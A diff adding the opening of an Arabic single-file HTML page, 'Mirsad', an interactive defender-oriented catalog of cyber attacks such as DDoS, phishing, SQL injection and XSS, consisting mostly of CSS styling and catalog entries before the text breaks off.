@@ -1,0 +1,1528 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>مِرصاد — تشريح الهجمات السيبرانية تفاعلياً</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans+Arabic:wght@300;400;500;600;700&family=IBM+Plex+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg:#0B0D0F;--panel:#111417;--panel2:#151A1E;--line:#232A30;--line2:#2E3740;
+    --ink:#EAE5D8;--mut:#96A0A8;--dim:#5E6870;--acc:#F2A93B;--red:#E5484D;--grn:#5BBE8E;
+    --mono:'IBM Plex Mono',monospace;--sans:'IBM Plex Sans Arabic',sans-serif;
+  }
+  *{margin:0;padding:0;box-sizing:border-box}
+  html{color-scheme:dark;scroll-behavior:smooth}
+  body{background:var(--bg);color:var(--ink);font-family:var(--sans);overflow-x:hidden}
+  body::before{content:'';position:fixed;inset:0;pointer-events:none;z-index:0;
+    background-image:repeating-linear-gradient(90deg,rgba(255,255,255,.015) 0 1px,transparent 1px 72px)}
+  .wrap{position:relative;z-index:1;max-width:1180px;margin:0 auto;padding:26px 20px 60px}
+  ::selection{background:var(--acc);color:#171105}
+  .mono{font-family:var(--mono)}
+  .panel{border:1px solid var(--line);background:var(--panel);margin-top:18px;position:relative}
+  .p-head{display:flex;align-items:center;gap:10px;padding:11px 16px;border-bottom:1px solid var(--line);font-size:12px;font-weight:600;color:var(--mut);flex-wrap:wrap}
+  .p-tag{margin-inline-start:auto;font:500 10px var(--mono);color:var(--dim);letter-spacing:1.2px}
+  .dot{width:7px;height:7px;border-radius:50%;background:var(--red);animation:blink 1.6s infinite;flex:none}
+  @keyframes blink{0%,100%{opacity:1}50%{opacity:.2}}
+  .duo{margin-top:18px;display:grid;grid-template-columns:1fr 1fr;gap:18px}
+  .duo>.panel{margin-top:0}
+  .hint{font-size:10.5px;color:var(--dim);font-weight:400}
+
+  /* ===== الواجهة والفهرس ===== */
+  header{padding:10px 0 4px}
+  h1{font-size:clamp(30px,4.4vw,42px);font-weight:700;letter-spacing:-.5px;line-height:1.15}
+  h1 em{font-style:normal;color:var(--acc)}
+  .sub{font:600 10.5px var(--mono);color:var(--acc);letter-spacing:2.5px;margin-top:6px}
+  .lead{max-width:660px;color:var(--mut);font-size:14px;line-height:1.85;margin-top:14px;font-weight:300}
+  .lead b{color:var(--ink);font-weight:500}
+  .hero-stats{font:500 10.5px var(--mono);color:var(--dim);letter-spacing:1.6px;margin-top:16px;direction:ltr;text-align:right}
+  .cat-row{display:grid;grid-template-columns:52px minmax(0,1fr) 132px 96px 34px;gap:14px;align-items:center;padding:16px 18px;border-bottom:1px solid var(--line);cursor:pointer;transition:background .18s;position:relative}
+  .cat-row:last-child{border-bottom:none}
+  .cat-row::before{content:'';position:absolute;inset-inline-start:0;top:0;bottom:0;width:3px;background:transparent;transition:.2s}
+  .cat-row:hover{background:rgba(255,255,255,.02)}
+  .cat-row:hover::before,.cat-row:focus-visible::before{background:var(--acc)}
+  .cat-row:focus-visible{outline:1px solid var(--acc);outline-offset:-2px}
+  .cat-no{font:600 14px var(--mono);color:var(--dim)}
+  .cat-main b{font-size:17px;font-weight:600;display:block}
+  .cat-main i{font:500 10px var(--mono);color:var(--acc);letter-spacing:1px;font-style:normal;display:block;margin-top:3px}
+  .cat-main em{font-size:12px;color:var(--mut);font-style:normal;display:block;margin-top:5px;line-height:1.6;font-weight:300}
+  .cat-target{font-size:11px;color:var(--mut);border:1px solid var(--line2);padding:3px 10px;text-align:center;white-space:nowrap}
+  .cat-sev{display:flex;gap:3px;justify-content:center}
+  .cat-sev span{width:12px;height:4px;background:var(--line2)}
+  .cat-sev span.f{background:var(--acc)}
+  .cat-sev span.f.hot{background:var(--red)}
+  .cat-arrow{font:400 18px var(--mono);color:var(--dim);text-align:center}
+  .cat-row.teaser{opacity:.45;cursor:default}
+  .cat-row.teaser:hover{background:none}.cat-row.teaser:hover::before{background:transparent}
+
+  /* ===== غلاف الوحدة ===== */
+  .module{margin-top:18px}
+  .mod-top{display:flex;justify-content:space-between;align-items:center;margin-bottom:12px}
+  .back{font:500 12px var(--sans);padding:7px 14px;border:1px solid var(--line2);background:transparent;color:var(--mut);cursor:pointer;transition:.18s}
+  .back:hover{border-color:var(--acc);color:var(--acc)}
+  .mod-no{font:600 11px var(--mono);color:var(--dim);letter-spacing:2px}
+  .mod-title{font-size:clamp(22px,3vw,30px);font-weight:700;letter-spacing:-.4px}
+  .mod-title .en{font:500 11px var(--mono);color:var(--acc);letter-spacing:1.5px;margin-inline-start:12px;vertical-align:3px}
+  .mod-lead{color:var(--mut);font-size:13.5px;line-height:1.9;margin-top:10px;max-width:760px;font-weight:300}
+  .mod-lead b{color:var(--ink);font-weight:500}
+  .mod-end{margin-top:16px;text-align:center}
+
+  /* ===== عناصر تحكم مشتركة ===== */
+  .seg{display:grid;grid-template-columns:1fr 1fr;gap:8px}
+  .seg.c4{grid-template-columns:1fr 1fr}
+  .seg button{padding:9px 12px;border:1px solid var(--line2);background:transparent;color:var(--ink);cursor:pointer;text-align:start;transition:.18s;font-family:var(--sans)}
+  .seg button b{display:block;font-size:13px;font-weight:600}
+  .seg button i{display:block;font-style:normal;font-size:10.5px;color:var(--dim);margin-top:3px}
+  .seg button:hover{border-color:var(--mut)}
+  .seg.red button.on{border-color:rgba(229,72,77,.55);background:rgba(229,72,77,.06)}
+  .seg.red button.on b{color:#E8767A}
+  .sw{direction:ltr;width:52px;height:26px;border:1px solid var(--line2);background:#0D1013;position:relative;flex:none;transition:border-color .2s;cursor:pointer}
+  .sw i{position:absolute;top:4px;left:4px;width:20px;height:16px;background:#39424B;transition:.22s cubic-bezier(.4,0,.2,1)}
+  .sw.on{border-color:var(--acc)}
+  .sw.on i{left:27px;background:var(--acc)}
+  .btn{font:500 12.5px var(--sans);padding:9px 18px;border:1px solid var(--line2);background:transparent;color:var(--ink);cursor:pointer;transition:.18s}
+  .btn:hover{border-color:var(--acc);color:var(--acc)}
+  .btn.on{background:var(--acc);color:#171105;border-color:var(--acc);font-weight:600}
+  input[type=text],input[type=password]{background:#0D1013;border:1px solid var(--line2);color:var(--ink);padding:9px 12px;font-family:var(--sans);font-size:13.5px;width:100%}
+  input[type=text]:focus,input[type=password]:focus{outline:none;border-color:var(--acc)}
+  input[type=range]{width:100%;margin-top:8px;accent-color:var(--red);cursor:pointer}
+  .cbody{padding:16px}
+  .c-lab{font-size:11.5px;font-weight:600;color:var(--mut);margin:16px 0 8px}
+  .cbody .c-lab:first-child{margin-top:0}
+  .slider-row.dis{opacity:.35;pointer-events:none}
+  .sl-head{display:flex;justify-content:space-between;align-items:baseline}
+  .sl-head .v{font:600 13px var(--mono);color:#E8767A;direction:ltr}
+  .drow{display:grid;grid-template-columns:34px minmax(0,1fr) auto;gap:12px;align-items:center;padding:12px 16px;border-bottom:1px solid var(--line);cursor:pointer;transition:background .2s;position:relative}
+  .drow:last-child{border-bottom:none}
+  .drow::before{content:'';position:absolute;inset-inline-start:0;top:0;bottom:0;width:3px;background:transparent;transition:.25s}
+  .drow.on::before{background:var(--acc)}
+  .drow:hover{background:rgba(255,255,255,.018)}
+  .drow.on{background:rgba(242,169,59,.028)}
+  .d-num{font:600 12px var(--mono);color:var(--dim)}
+  .drow.on .d-num{color:var(--acc)}
+  .d-name{font-size:13.5px;font-weight:600}
+  .d-code{font:500 9.5px var(--mono);color:var(--mut);border:1px solid var(--line2);padding:2px 6px;margin-inline-start:8px;letter-spacing:.8px}
+  .drow.on .d-code{color:var(--acc);border-color:rgba(242,169,59,.4)}
+  .d-desc{font-size:11.5px;color:var(--mut);line-height:1.7;margin-top:4px;font-weight:300}
+  .cap{display:flex;flex-wrap:wrap;align-items:center;gap:6px;padding:7px 16px;border-bottom:1px solid rgba(255,255,255,.04);animation:capIn .35s ease}
+  @keyframes capIn{from{opacity:0;transform:translateY(-5px)}}
+  .ct{font:500 10.5px var(--mono);color:var(--dim)}
+  .chipx{font:500 11px var(--mono);padding:2px 8px;border:1px solid;white-space:nowrap}
+  .c-red{color:#E8767A;border-color:rgba(229,72,77,.35);background:rgba(229,72,77,.07)}
+  .c-acc{color:var(--acc);border-color:rgba(242,169,59,.35);background:rgba(242,169,59,.06)}
+  .c-grn{color:var(--grn);border-color:rgba(91,190,142,.35);background:rgba(91,190,142,.07)}
+  .c-dim{color:var(--dim);border-color:var(--line)}
+  .logbox{padding:8px 0;min-height:120px}
+  .facts{padding:4px 16px 8px}
+  .fact{display:grid;grid-template-columns:52px 250px 1fr;gap:16px;padding:16px 0;border-bottom:1px dashed var(--line);align-items:start}
+  .fact:last-of-type{border-bottom:none}
+  .f-no{font:600 14px var(--mono);color:var(--dim);padding-top:2px}
+  .f-t{font-size:14px;font-weight:600;line-height:1.6}
+  .f-d{font-size:12.6px;color:var(--mut);line-height:1.8;font-weight:300}
+  .f-d b{color:var(--ink);font-weight:500}
+  .verdict{margin:14px 4px 18px;padding:15px 18px;border:1px solid rgba(242,169,59,.3);background:rgba(242,169,59,.04);font-size:13px;line-height:1.85;color:var(--ink);font-weight:300}
+  .verdict b{color:var(--acc);font-weight:600}
+
+  /* ===== وحدة الإغراق ===== */
+  .stage{display:block;width:100%;height:auto}
+  .wire{stroke:var(--line2);stroke-width:1.5;stroke-dasharray:5 7}
+  .tick{stroke:var(--line);stroke-width:1}
+  .node{fill:var(--panel2);stroke:var(--line2);stroke-width:1.2}
+  .ndet{stroke:var(--line2);stroke-width:1.2}
+  .nlab{fill:var(--mut);font:600 12px var(--sans)}
+  .nsub{fill:var(--dim);font:400 10.5px var(--sans)}
+  .dirhint{fill:var(--dim);font:400 10.5px var(--sans)}
+  .sled{fill:var(--grn)}
+  .stage.s-warn .sled{fill:var(--acc)}
+  .stage.s-down .sled{fill:var(--red);animation:blink .45s infinite}
+  .stage.s-down #dInner{animation:shk .3s infinite}
+  @keyframes shk{0%,100%{translate:0 0}25%{translate:1.6px .6px}50%{translate:-1.6px -.6px}75%{translate:1px -1px}}
+  .stbox{fill:#0D1013;stroke:var(--line2)}
+  .stTxt{fill:var(--mut);font:600 11.5px var(--sans);text-anchor:middle}
+  .stChip.st-ok .stbox{stroke:rgba(91,190,142,.55)}.stChip.st-ok .stTxt{fill:var(--grn)}
+  .stChip.st-warn .stbox{stroke:rgba(242,169,59,.55)}.stChip.st-warn .stTxt{fill:var(--acc)}
+  .stChip.st-down .stbox{stroke:var(--red);fill:rgba(229,72,77,.12)}.stChip.st-down .stTxt{fill:var(--red)}
+  .shld{fill:none;stroke:var(--acc);stroke-width:1;stroke-dasharray:4 6}
+  .gtxt{fill:var(--acc);font:500 10px var(--mono)}
+  .botbody{fill:#171416;stroke:#5A3438;stroke-width:1.2}
+  .botled{fill:var(--red)}
+  .refl{fill:var(--panel2);stroke:var(--line2);stroke-width:1.2}
+  .userbody{fill:var(--panel2);stroke:var(--line2);stroke-width:1.2}
+  .ft-note{fill:#E8767A;font:500 10.5px var(--sans);text-anchor:middle}
+  .pk-syn{fill:rgba(229,72,77,.14);stroke:#E5484D;stroke-width:1.3}
+  .pk-udp{fill:rgba(229,72,77,.18);stroke:#E5484D;stroke-width:1.2}
+  .pk-ampq{fill:#E5484D}
+  .pk-ampb{fill:rgba(229,72,77,.22);stroke:#E5484D;stroke-width:1.3}
+  .pk-legit{fill:rgba(91,190,142,.14);stroke:var(--grn);stroke-width:1.3}
+  .pl{stroke:rgba(229,72,77,.65);stroke-width:1}
+  .pulse{fill:none;stroke-width:1.5;transform-box:fill-box;transform-origin:center;animation:pul .7s ease-out forwards}
+  .p-red{stroke:var(--red)}.p-grn{stroke:var(--grn)}
+  @keyframes pul{from{transform:scale(.35);opacity:.9}to{transform:scale(1.7);opacity:0}}
+  .ft{font:600 11px var(--mono);animation:fup 1.1s ease-out forwards;text-anchor:middle}
+  .ft-red{fill:#E8767A}.ft-grn{fill:var(--grn)}
+  @keyframes fup{from{opacity:0}15%{opacity:1}to{opacity:0;transform:translateY(-16px)}}
+  .sb{display:flex;flex-wrap:wrap;gap:8px 22px;align-items:center;padding:11px 16px;border-top:1px solid var(--line);font-size:12px}
+  .sb .st{font-weight:600}
+  .st.t-ok{color:var(--grn)}.st.t-warn{color:var(--acc)}.st.t-down{color:var(--red)}
+  #dSbAtk.red{color:#E8767A}#dSbAtk.grn{color:var(--grn)}
+  #dSbDef{color:var(--dim);margin-inline-start:auto}
+  .vitals{display:grid;grid-template-columns:repeat(4,1fr);border-top:1px solid var(--line)}
+  .vit{padding:13px 15px;border-inline-start:1px solid var(--line)}
+  .vit:first-child{border-inline-start:none}
+  .v-name{font-size:11px;color:var(--mut);font-weight:600}
+  .v-val{font:600 19px var(--mono);direction:ltr;margin-top:7px}
+  .v-val small{font-size:10.5px;color:var(--dim);font-weight:500}
+  .v-val.v-grn{color:var(--grn)}.v-val.v-red{color:var(--red)}.v-val.v-acc{color:var(--acc)}
+  .vbar{height:8px;background:#0D1013;border:1px solid var(--line);margin-top:8px}
+  .vbar i{display:block;height:100%;background:var(--acc);width:0;transition:width .25s linear,background .3s}
+  .vbar i.hot{background:var(--red)}
+  .vspark{width:100%;height:42px;margin-top:8px;display:block}
+  #dLaunch{width:100%;margin-top:16px;padding:13px;border:1px solid #6E3539;background:rgba(229,72,77,.07);color:#E8767A;font:600 14px var(--sans);cursor:pointer;transition:.2s}
+  #dLaunch:hover{background:rgba(229,72,77,.15);border-color:var(--red)}
+  #dLaunch.armed{background:var(--red);border-color:var(--red);color:#1A0B0C}
+  #dPower{margin-top:14px;padding:10px 12px;border:1px dashed var(--line2);font-size:11.5px;color:var(--mut);line-height:1.95}
+  .pw-raw{color:#E8767A;font-weight:600;font-family:var(--mono)}
+  .pw-eff{color:var(--grn);font-weight:600;font-family:var(--mono)}
+  .mtx-wrap{padding:14px 16px;border-top:1px solid var(--line)}
+  .mtx-title{font-size:11.5px;font-weight:600;color:var(--mut);margin-bottom:10px}
+  .mtx{display:grid;grid-template-columns:96px repeat(4,1fr);gap:5px;align-items:center}
+  .mtx .mh{font:500 9.5px var(--mono);color:var(--dim);text-align:center}
+  .mtx .mr{font-size:10.5px;color:var(--mut);font-weight:600}
+  .badge{height:13px;border:1px solid var(--line2);background:#141719;cursor:help}
+  .b-full{background:var(--grn);border-color:var(--grn)}
+  .b-part{background:rgba(242,169,59,.5);border-color:rgba(242,169,59,.8)}
+  .mtx-legend{font-size:10px;color:var(--dim);margin-top:9px;line-height:1.7}
+
+  /* ===== وحدة التصيّد ===== */
+  .ph-grid{display:grid;grid-template-columns:1.25fr .75fr;gap:18px;margin-top:18px}
+  .ph-grid>.panel{margin-top:0}
+  .mail{background:#0E1215}
+  .m-bar{padding:9px 16px;border-bottom:1px solid var(--line);font:500 10.5px var(--mono);color:var(--dim);letter-spacing:1.2px;display:flex;gap:10px}
+  .m-bar b{color:var(--mut);font-weight:500}
+  .m-head{padding:13px 16px;border-bottom:1px solid var(--line);font-size:12.5px;line-height:2}
+  .m-head .lbl{color:var(--dim);font-size:11px;display:inline-block;min-width:64px}
+  .m-subj{font-size:15px;font-weight:600}
+  .m-urg-ico{display:inline-flex;width:16px;height:16px;background:var(--red);color:#1A0B0C;font:700 11px var(--mono);align-items:center;justify-content:center;margin-inline-end:7px;vertical-align:-2px}
+  .m-body{padding:18px 20px;font-size:13.5px;line-height:2.15;color:var(--ink);font-weight:300}
+  .m-body .m-link{color:#8FB8DE;text-decoration:underline;word-break:break-all;font-family:var(--mono);font-size:12px;direction:ltr;unicode-bidi:embed;display:inline-block}
+  .m-sig{color:var(--dim);margin-top:12px;font-size:12px}
+  .p-flag{cursor:pointer;border-bottom:1px dashed rgba(229,72,77,.55);transition:background .2s}
+  .p-flag:hover{background:rgba(229,72,77,.07)}
+  .p-flag.hit{border-bottom:1px solid var(--grn);background:rgba(91,190,142,.09);cursor:default}
+  .p-flag.hit:hover{background:rgba(91,190,142,.09)}
+  .p-flag.dim{opacity:.6;border-bottom-style:dotted}
+  .fmark{display:inline-block;width:9px;height:5px;border-inline-start:2px solid var(--grn);border-bottom:2px solid var(--grn);transform:rotate(-45deg) translateY(-2px);margin-inline-start:7px}
+  #pLinkHint{display:none;margin-top:8px;padding:10px 12px;border:1px dashed var(--red);font-size:11.5px;color:#E8767A;line-height:1.8;background:rgba(229,72,77,.05)}
+  #pLinkHint.show{display:block;animation:capIn .3s ease}
+  .p-count{font:600 30px var(--mono);color:var(--acc);direction:ltr;padding:16px 16px 4px}
+  .p-count small{font-size:12px;color:var(--dim)}
+  #pList{list-style:none;padding:8px 16px}
+  #pList li{padding:10px 0;border-bottom:1px dashed var(--line)}
+  #pList li.dim{opacity:.55}
+  #pList li b{font-size:12.5px;color:var(--acc);display:block}
+  #pList li span{font-size:11.5px;color:var(--mut);line-height:1.75;display:block;margin-top:4px;font-weight:300}
+  .p-actions{padding:12px 16px}
+  #pVer{display:none;margin:0 16px 16px;padding:13px 15px;border:1px solid rgba(91,190,142,.4);background:rgba(91,190,142,.05);font-size:12.5px;line-height:1.85}
+  #pVer.show{display:block;animation:capIn .35s ease}
+
+  /* ===== وحدة الحقن ===== */
+  .sq-grid{display:grid;grid-template-columns:1fr 1fr;gap:18px;margin-top:18px}
+  .sq-grid>.panel{margin-top:0}
+  .form-row{padding:12px 16px 0}
+  .form-row label{font-size:11.5px;color:var(--mut);font-weight:600;display:block;margin-bottom:6px}
+  .form-actions{display:flex;gap:8px;flex-wrap:wrap;padding:14px 16px 16px}
+  .qbox{margin:0 16px 16px;border:1px solid var(--line2);background:#0D1013}
+  .q-head{display:flex;align-items:center;gap:10px;padding:8px 12px;border-bottom:1px solid var(--line);font-size:11px;color:var(--dim);font-weight:600}
+  .q-head .sw{margin-inline-start:auto;width:44px;height:22px}
+  .q-head .sw i{width:17px;height:13px;top:4px;left:4px}
+  .q-head .sw.on i{left:22px}
+  #sqQ{padding:12px;font:500 12px var(--mono);direction:ltr;text-align:left;line-height:1.8;word-break:break-all;color:#B9C2C9;min-height:52px}
+  #sqQ .inj{color:var(--red);background:rgba(229,72,77,.12)}
+  #sqQ .lit{color:var(--grn)}
+  #sqParams{display:none;padding:0 12px 12px;font:500 11px var(--mono);direction:ltr;text-align:left;color:var(--dim)}
+  #sqParams.show{display:block}
+  #sqParams b{color:var(--grn);font-weight:500}
+  table.sq-t{width:100%;border-collapse:collapse;font-size:12px}
+  .sq-t th{font:500 10px var(--mono);color:var(--dim);text-align:right;padding:8px 16px;border-bottom:1px solid var(--line);letter-spacing:1px}
+  .sq-t td{padding:9px 16px;border-bottom:1px solid rgba(255,255,255,.04);color:var(--mut)}
+  .sq-t td.mono{direction:ltr;text-align:left;font-family:var(--mono);font-size:11px;color:var(--dim)}
+  .sq-t tr.hit td{background:rgba(229,72,77,.09);color:#E8767A}
+  #sqRes{margin:14px 16px 16px;padding:13px 15px;font-size:12.5px;line-height:1.85;display:none}
+  #sqRes.show{display:block;animation:capIn .3s ease}
+  #sqRes.ok{border:1px solid rgba(91,190,142,.4);background:rgba(91,190,142,.05)}
+  #sqRes.bad{border:1px solid rgba(229,72,77,.45);background:rgba(229,72,77,.06)}
+  #sqRes b{display:block;margin-bottom:4px}
+  #sqRes.ok b{color:var(--grn)}#sqRes.bad b{color:#E8767A}
+  #sqRes span{color:var(--mut);font-weight:300}
+
+  /* ===== وحدة XSS ===== */
+  .x-cmt{padding:14px 16px;display:flex;gap:8px}
+  .x-cmt input{flex:1}
+  .x-actions{display:flex;gap:8px;padding:0 16px 14px;flex-wrap:wrap}
+  #xList{list-style:none;padding:4px 0}
+  #xList li{margin:0 16px 10px;padding:11px 14px;border:1px solid var(--line2);background:#0E1215;animation:capIn .3s ease}
+  #xList li .who{font-size:11px;color:var(--acc);font-weight:600}
+  #xList li .txt{font-size:13px;line-height:1.8;margin-top:4px;word-break:break-word}
+  #xList li .txt.raw{font-family:var(--mono);font-size:11.5px;color:var(--dim);direction:ltr;text-align:left}
+  #xList li .tagline{font-size:10.5px;margin-top:6px}
+  #xList li.exec{border-color:rgba(229,72,77,.5);background:rgba(229,72,77,.05)}
+  #xList li.exec .tagline{color:#E8767A}
+  #xList li.safe .tagline{color:var(--grn)}
+  #xAlert{display:none;margin:0 16px 14px;padding:13px 15px;border:1px solid var(--red);background:rgba(229,72,77,.08);font-size:12.5px;line-height:1.8}
+  #xAlert.show{display:flex;gap:12px;align-items:flex-start;animation:capIn .3s ease}
+  .xa-ico{width:20px;height:20px;background:var(--red);color:#1A0B0C;font:700 13px var(--mono);display:flex;align-items:center;justify-content:center;flex:none;margin-top:2px}
+  .xa-body b{color:#E8767A;display:block}
+  .xa-body span{color:var(--mut);font-family:var(--mono);font-size:11px;direction:ltr;display:block}
+  .x-loot{padding:12px 16px;border-top:1px solid var(--line)}
+  .x-loot .t{font-size:11.5px;font-weight:600;color:#E8767A;margin-bottom:9px}
+  #xLoot{display:flex;flex-wrap:wrap;gap:6px}
+  #xCount{font:600 12px var(--mono);color:#E8767A;direction:ltr}
+
+  /* ===== وحدة التخمين ===== */
+  .b-big{font:600 34px var(--mono);direction:ltr;padding:16px 18px 2px}
+  .b-big small{font-size:12px;color:var(--dim);font-weight:500}
+  .b-sub{padding:0 18px 12px;font-size:11.5px;color:var(--dim)}
+  .b-rows{padding:6px 18px 16px}
+  .b-row{display:grid;grid-template-columns:190px 1fr auto;gap:14px;align-items:center;padding:9px 0;border-bottom:1px dashed var(--line)}
+  .b-row:last-child{border-bottom:none}
+  .b-row .k{font-size:11.5px;color:var(--mut)}
+  .b-row .k i{display:block;font-style:normal;font-size:10px;color:var(--dim);margin-top:2px}
+  .b-bar{height:8px;background:#0D1013;border:1px solid var(--line)}
+  .b-bar i{display:block;height:100%;background:var(--grn);transition:width .3s}
+  .b-row .v{font:600 14px var(--mono);direction:ltr;color:var(--ink);white-space:nowrap;min-width:92px;text-align:left}
+  .pin-row{display:flex;gap:14px;flex-wrap:wrap;padding:6px 18px 0}
+  .pin-cell .k{font-size:10.5px;color:var(--dim);display:block;margin-bottom:4px}
+  .pin-cell .v{font:600 22px var(--mono);direction:ltr;display:block}
+  .pin-cell .v.hot{color:var(--red)}
+  .pin-cell .v.ok{color:var(--grn)}
+  #bLock{font:500 11px var(--mono);color:var(--acc)}
+  .pin-bar{margin:14px 18px 0;height:10px;background:#0D1013;border:1px solid var(--line)}
+  .pin-bar i{display:block;height:100%;background:var(--red);width:0;transition:width .15s linear}
+  .pin-actions{display:flex;gap:8px;flex-wrap:wrap;padding:14px 18px 6px}
+  #bEta{padding:0 18px 14px;font-size:11.5px;color:var(--mut);line-height:1.8}
+  #bFound{display:none;margin:0 18px 18px;padding:13px 15px;border:1px solid rgba(229,72,77,.45);background:rgba(229,72,77,.06);font-size:12.5px;line-height:1.85}
+  #bFound.show{display:block;animation:capIn .3s ease}
+  #bFound b{color:#E8767A;display:block}
+  #bFound span{color:var(--mut);font-weight:300}
+
+  /* ===== وحدة المنتصف ===== */
+  .mk-plain{fill:#EFE9DB;stroke:var(--red);stroke-width:1.3}
+  .mk-plainC{fill:#EFE9DB;stroke:var(--red);stroke-width:1.3}
+  .mk-enc{fill:rgba(242,169,59,.16);stroke:var(--acc);stroke-width:1.3}
+  .mk-bits{fill:var(--acc)}
+  .m-eye .eyeball{fill:#0D1013;stroke:#5E6870;stroke-width:1.6;transition:stroke .4s}
+  .m-eye .pupil{fill:#39424B;transition:fill .4s}
+  .m-eye .glint{fill:#2E3740}
+  .m-eye.seeing .eyeball{stroke:var(--red)}
+  .m-eye.seeing .pupil{fill:var(--red)}
+  .m-ctrl{display:flex;gap:16px;align-items:center;flex-wrap:wrap;padding:13px 16px;border-top:1px solid var(--line)}
+  .m-ctrl .lab{font-size:12px;font-weight:600}
+  .m-ctrl .grp{display:flex;align-items:center;gap:9px}
+  #mState{padding:0 16px 12px;font-size:11.5px;color:var(--dim);line-height:1.8}
+  #mKnow{display:flex;flex-wrap:wrap;gap:6px;padding:12px 16px;border-top:1px solid var(--line);align-items:center}
+  #mKnow .k{font-size:11px;color:var(--dim);font-weight:600}
+  #mWarn{display:none;margin:14px 18px 18px;border:1px solid var(--red);background:rgba(229,72,77,.07)}
+  #mWarn.show{display:block;animation:capIn .3s ease}
+  .mw-head{display:flex;gap:10px;align-items:center;padding:11px 14px;border-bottom:1px solid rgba(229,72,77,.3);font-size:13px;font-weight:600;color:#E8767A}
+  .mw-body{padding:11px 14px;font-size:12px;color:var(--mut);line-height:1.85}
+  .mw-body .mono{direction:ltr;unicode-bidi:embed;color:#E8767A}
+  .mw-actions{display:flex;gap:8px;padding:0 14px 13px;flex-wrap:wrap}
+  .mw-safe{font:600 12px var(--sans);padding:8px 14px;background:var(--grn);border:1px solid var(--grn);color:#0B1512;cursor:pointer}
+  .mw-bad{font:500 12px var(--sans);padding:8px 14px;background:transparent;border:1px solid #6E3539;color:#E8767A;cursor:pointer}
+  .mw-bad:hover{background:rgba(229,72,77,.12)}
+
+  /* ===== النشر ===== */
+  .dep-steps{padding:6px 16px 10px}
+  .dep-step{display:grid;grid-template-columns:40px 1fr;gap:14px;padding:14px 0;border-bottom:1px dashed var(--line)}
+  .dep-step:last-child{border-bottom:none}
+  .dep-step .n{font:600 14px var(--mono);color:var(--acc)}
+  .dep-step .t{font-size:13.5px;font-weight:600}
+  .dep-step .d{font-size:12.5px;color:var(--mut);line-height:1.9;margin-top:5px;font-weight:300}
+  .dep-step code{font:500 11px var(--mono);background:#0D1013;border:1px solid var(--line2);padding:2px 8px;direction:ltr;unicode-bidi:embed;color:var(--acc);white-space:nowrap}
+  .dep-code{margin:4px 16px 18px;background:#0D1013;border:1px solid var(--line2);padding:14px 16px;font:500 11.5px var(--mono);direction:ltr;text-align:left;color:#B9C2C9;line-height:2;overflow-x:auto}
+  .dep-code .c{color:var(--dim)}
+  .dep-note{margin:0 16px 18px;padding:12px 15px;border:1px dashed var(--line2);font-size:11.5px;color:var(--mut);line-height:1.85}
+
+  footer{margin-top:26px;text-align:center;color:var(--dim);font-size:11px;line-height:1.9}
+  #toast{position:fixed;bottom:22px;inset-inline-start:22px;max-width:390px;background:var(--panel2);border:1px solid var(--line2);border-inline-start:3px solid var(--acc);padding:13px 17px;font-size:13px;line-height:1.75;opacity:0;transform:translateY(10px);transition:.3s;pointer-events:none;z-index:60;box-shadow:0 8px 30px rgba(0,0,0,.45)}
+  #toast.show{opacity:1;transform:none}
+  #toast.warn{border-inline-start-color:var(--red)}
+
+  @media(max-width:940px){
+    .duo,.ph-grid,.sq-grid{grid-template-columns:1fr}
+    .vitals{grid-template-columns:1fr 1fr}
+    .vit:nth-child(n+3){border-top:1px solid var(--line)}
+    .vit:nth-child(3){border-inline-start:none}
+    .cat-row{grid-template-columns:38px minmax(0,1fr) 24px}
+    .cat-target,.cat-sev{display:none}
+    .fact{grid-template-columns:1fr;gap:6px}
+    .f-no{display:none}
+    .b-row{grid-template-columns:1fr;gap:6px}
+    .b-row .v{text-align:right}
+  }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <!-- ============ الواجهة ============ -->
+  <header id="hero">
+    <h1>مِرصاد<em>.</em></h1>
+    <div class="sub" dir="ltr">MIRSAD · CYBER ATTACK ANATOMY · INTERACTIVE</div>
+    <p class="lead">
+      موسوعة تفاعلية تُشرّح أشهر الهجمات السيبرانية <b>من مقعد المدافع</b>: كل هجوم له مختبر حي
+      تشغّله بيدك — تطلق الهجوم، ترى بالضبط كيف يسقط الهدف، ثم تفعّل الدفاع الصحيح وتُعيده للحياة.
+      لا أدوات هجوم، لا كود استغلال، لا خوادم: <b>ملف واحد يعمل في متصفحك</b> — جاهز للنشر على GitHub Pages.
+    </p>
+    <div class="hero-stats">06 ATTACKS · 06 LIVE LABS · 01 FILE · 00 SERVERS</div>
+  </header>
+
+  <!-- ============ الفهرس ============ -->
+  <section class="panel" id="catalog">
+    <div class="p-head">
+      <span>فهرس التشريح — اختر هجوماً وادخل مختبره</span>
+      <span class="p-tag" dir="ltr">INDEX</span>
+    </div>
+    <div class="cat-row" data-mod="mod-ddos" tabindex="0" role="button">
+      <span class="cat-no" dir="ltr">01</span>
+      <span class="cat-main"><b>الإغراق</b><i dir="ltr">DDoS · DoS</i><em>سباق موارد بحت — لا اختراق، فقط طوفان. من يملك الطاقة الأكبر يسقط من؟</em></span>
+      <span class="cat-target">البنية التحتية</span>
+      <span class="cat-sev" data-s="4"></span>
+      <span class="cat-arrow">‹</span>
+    </div>
+    <div class="cat-row" data-mod="mod-phish" tabindex="0" role="button">
+      <span class="cat-no" dir="ltr">02</span>
+      <span class="cat-main"><b>التصيّد الاحتيالي</b><i dir="ltr">PHISHING</i><em>لا يخترق جهازك — يخترق ثقتك. اصطد المحتال: 6 مؤشرات خداع أمامك.</em></span>
+      <span class="cat-target">أنت</span>
+      <span class="cat-sev" data-s="5"></span>
+      <span class="cat-arrow">‹</span>
+    </div>
+    <div class="cat-row" data-mod="mod-sqli" tabindex="0" role="button">
+      <span class="cat-no" dir="ltr">03</span>
+      <span class="cat-main"><b>الاستعلام الخائن</b><i dir="ltr">SQL INJECTION</i><em>حقل في نموذج الدخول يتحول إلى شيفرة تُنفَّذ على قاعدة بياناتك.</em></span>
+      <span class="cat-target">قاعدة البيانات</span>
+      <span class="cat-sev" data-s="5"></span>
+      <span class="cat-arrow">‹</span>
+    </div>
+    <div class="cat-row" data-mod="mod-xss" tabindex="0" role="button">
+      <span class="cat-no" dir="ltr">04</span>
